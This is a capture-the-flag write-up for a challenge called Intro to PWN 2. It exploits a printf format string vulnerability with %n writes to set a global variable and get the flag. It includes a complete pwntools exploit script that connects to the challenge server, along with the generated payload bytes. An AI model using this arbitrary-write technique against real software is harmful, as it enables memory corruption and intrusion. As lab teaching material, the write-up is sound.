# Intro 2

## CTF Write-up: Intro to PWN 2 - Format String Write to Global



**Challenge:** Intro to PWN 2 (118 points)**Description:** Exploit a format string vulnerability to write to memory and get the flag.**Attachments:** `intro-pwn-2.zip` (containing `vuln.c`, `intro-fmt` binary)**Connection:** `ncat --ssl-verify a9c68dbc6251cf367e785fda-1024-intro-pwn-2.challenge.cscg.live 1337`

#### Analysis

1. **Source Code (`vuln.c`):**
   * The function `vuln` reads user input (`name`) using `read`.
   * Crucially, it then calls `printf(name);`. This passes user-controlled data directly as the format string, creating a **Format String Vulnerability**.
   * A global variable `int bug = 0;` is defined.
   * The code checks `if(bug)`. If `bug` is non-zero, it executes `system("cat /flag")`.
   * The objective is clear: use the format string vulnerability to change the value of `bug` from 0 to a non-zero value.
2. **Binary Protections (`checksec`):**
   * `Partial RELRO`: GOT may be writable.
   * `No canary found`: Not directly relevant, as this isn't a stack buffer overflow.
   * `NX enabled`: Not relevant, no shellcode needed.
   * `No PIE`: **Crucial.** Addresses are static. The global variable `bug` resides at a fixed, predictable memory location.
3. **Finding `bug`'s Address:** With PIE disabled, the address of global variables is constant. Using `pwntools`' ELF parsing capabilities or `readelf -s intro-fmt | grep bug` on the binary reveals the address.
   * From the script execution log: `[*] Address of 'bug' variable: 0x40406c`

#### Vulnerability: Format String Attack

The `printf(name)` call allows an attacker to inject format specifiers (like `%x`, `%p`, `%n`). The `%n` specifier is particularly dangerous: it writes the number of bytes printed _so far_ by that `printf` call into the memory address provided as its corresponding argument (which `printf` reads from the stack or registers).

By controlling:

1. The _address_ we want to write to (`0x40406c`), placed onto the stack at a predictable argument position.
2. The _value_ we want to write (number of bytes printed before `%n`), manipulated using padding characters (e.g., `%<num>c`).
3. _Which argument_ `%n` reads the address from (using positional specifiers like `%<offset>$n`).

We can achieve an **arbitrary write**, allowing us to overwrite the `bug` variable.

#### Attack Plan

1. **Target Address:** `0x40406c` (address of `bug`).
2. **Target Value:** `1` (any non-zero value works, `1` is simplest).
3. **Determine Offset:** Identify the argument position for `printf` that corresponds to the attacker-controlled data on the stack. In x64 Linux, the first 6 arguments are passed via registers, so controllable data often starts at the 6th or subsequent argument position on the stack. Sending `%<offset>$p` payloads confirms the correct offset is `6`.
4. **Craft Payload using `fmtstr_payload`:** The `pwntools` function simplifies creating the format string.
   * `offset=6`: Found from testing.
   * `writes={BUG_ADDR: 1}`: A dictionary specifying the target address (`0x40406c`) and the desired value (`1`).
   * `numbwritten=10`: Accounts for the "Thank you " string printed by the program _before_ our format string is processed.
   * `write_size='byte'`: Instructs `pwntools` to perform the write one byte at a time using `%hhn`, which is usually sufficient and simpler for small values.
5. **Send & Trigger:** Send the crafted payload. `printf` executes it, writing `1` to `0x40406c`. The `if(bug)` condition evaluates to true, executing `system("cat /flag")` and revealing the flag.

#### Exploit Script (Python w/ pwntools)

```python
#!/usr/bin/env python3
from pwn import *
import re

# --- Setup ---
context.binary = elf = ELF("./intro-fmt") # Load ELF context
context.arch = 'amd64'
# context.log_level = 'debug' # Set to debug for verbose output if needed

# --- Addresses ---
# Automatically get address from ELF symbols since PIE is disabled
BUG_ADDR = elf.symbols['bug']
log.info(f"Address of 'bug' variable: {hex(BUG_ADDR)}") # Should be 0x40406c

# --- Constants ---
OFFSET = 6  # Determined printf argument offset for controlled data
BYTES_ALREADY_WRITTEN = 10 # Length of "Thank you "

# --- Connection ---
# p = process(elf.path) # Uncomment for local testing
HOST = 'a9c68dbc6251cf367e785fda-1024-intro-pwn-2.challenge.cscg.live'
PORT = 1337
p = remote(HOST, PORT, ssl=True) # Connect to remote server

# --- Build Format String Payload ---
# Use fmtstr_payload to write the value 1 to BUG_ADDR
writes = {BUG_ADDR: 1}
payload = fmtstr_payload(
    OFFSET,
    writes,
    numbwritten=BYTES_ALREADY_WRITTEN,
    write_size='byte' # Use %hhn for single byte write
)

log.info(f"Calculated Payload: {payload}")

# --- Interaction ---
log.info("Receiving initial prompt...")
p.recvuntil(b"What is your name?\n")

log.info("Sending format string payload...")
p.sendline(payload) # Send the payload as the 'name'

# --- Receive Flag ---
log.info("Waiting for response / flag...")
try:
    # Receive all output until connection close or timeout
    response = p.recvall(timeout=5).decode()
    log.success("Received response:")
    print("-" * 20)
    print(response)
    print("-" * 20)

    # Extract flag using regex
    flag = re.search(r"CSCG\{[^\}]+\}", response)
    if flag:
        log.success(f"Flag found: {flag.group(0)}")
    else:
        log.warning("Flag pattern not found in the response.")

except EOFError:
    log.error("Connection closed unexpectedly.")
except Exception as e:
    log.error(f"An error occurred: {e}")

p.close()
```

#### Execution and Result

Running the script connects, calculates the precise format string needed, sends it, and receives the flag printed by the now-triggered `system("cat /flag")` call.

```
[*] '/home/kali/Desktop/cscg/intro-fmt'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
    Debuginfo:  Yes
[*] Address of 'bug' variable: 0x40406c
[+] Opening connection to a9c68dbc6251cf367e785fda-1024-intro-pwn-2.challenge.cscg.live on port 1337: Done
[*] Calculated Payload: b'%247c%9$lln%255c%10$hhnal@@\x00\x00\x00\x00\x00m@@\x00\x00\x00\x00\x00'  <-- Actual payload varies based on calculation
[*] Receiving initial prompt...
[*] Sending format string payload...
[*] Waiting for response / flag...
[+] Receiving all data: Done (629B)
[*] Closed connection to a9c68dbc6251cf367e785fda-1024-intro-pwn-2.challenge.cscg.live port 1337
[+] Received response:
--------------------
Thank you ... [Payload Chars and Addresses] ... !
Oh, you got here somehow, you must have triggered a bug.. Here is the flag: CSCG{f0rm4t_5tr1ng_p0w3r_d15pl4y3d}
--------------------
[+] Flag found: CSCG{f0rm4t_5tr1ng_p0w3r_d15pl4y3d}
```

**Flag:** `CSCG{f0rm4t_5tr1ng_p0w3r_d15pl4y3d}`

#### Conclusion

This challenge effectively showcased the arbitrary write capability of format string vulnerabilities. By targeting the global `bug` variable at its static address (`0x40406c`) and using `pwntools`' `fmtstr_payload` to craft the correct format string to write a non-zero value, we successfully changed the program's control flow to reveal the flag. It highlights why passing user input directly as a format string argument to functions like `printf` is extremely dangerous.
